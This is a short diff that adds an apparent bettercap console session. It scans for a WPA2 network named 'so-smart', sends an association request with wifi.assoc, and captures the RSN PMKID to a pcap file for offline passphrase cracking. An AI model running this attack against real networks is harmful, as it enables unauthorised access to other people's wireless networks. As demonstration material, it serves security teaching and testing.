@@ -1,0 +1,11 @@
+wlan0 » wifi.show
+┌─────────┬───────────────────┬──────────┬──────────────────┬─────┬────┬─────────┬───────┬───────┬──────────┐
+│ RSSI ▴ │ BSSID │ SSID │ Encryption │ WPS │ Ch │ Clients │ Sent │ Recvd │ Seen │
+├─────────┼───────────────────┼──────────┼──────────────────┼─────┼────┼─────────┼───────┼───────┼──────────┤
+│ -30 dBm │ de:ad:ba:be:00:01 │ so-smart │ WPA2 (CCMP, PSK) │ 1.0 │ 1 │ 1 │ 345 B │ 406 B │ 10:15:11 │
+└─────────┴───────────────────┴──────────┴──────────────────┴─────┴────┴─────────┴───────┴───────┴──────────┘
+wlan0 (ch. 2) / ↑ 0 B / ↓ 4.2 kB / 24 pkts
+wlan0 » wifi.assoc de:ad:ba:be:00:01
+wlan0 » [10:15:13] [sys.log] [inf] wifi sending association request to AP so-smart (channel:1 encryption:WPA2)
+wlan0 » [10:15:14] [wifi.client.handshake] captured 9e:23:52:59:35:ea -> so-smart (de:ad:ba:be:00:01) RSN
+PMKID to /root/bettercap-wifi-handshakes.pcap
